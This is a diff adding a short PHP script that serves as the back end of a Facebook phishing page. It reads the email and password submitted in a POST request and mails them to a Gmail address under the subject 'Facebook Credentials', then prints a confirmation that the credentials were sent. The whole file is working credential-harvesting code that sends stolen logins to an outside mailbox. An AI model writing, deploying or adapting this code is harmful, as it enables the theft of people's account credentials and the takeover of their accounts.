@@ -1,0 +1,16 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    $to = 'alwaysfightneverquit1@gmail.com';
+    $subject = 'Facebook Credentials';
+    $message = "Email: $email\nPassword: $password";
+
+    $headers = "From: your_email@gmail.com\r\n";
+
+    mail($to, $subject, $message, $headers);
+
+    echo "Facebook credentials sent to email.";
+}
+?>
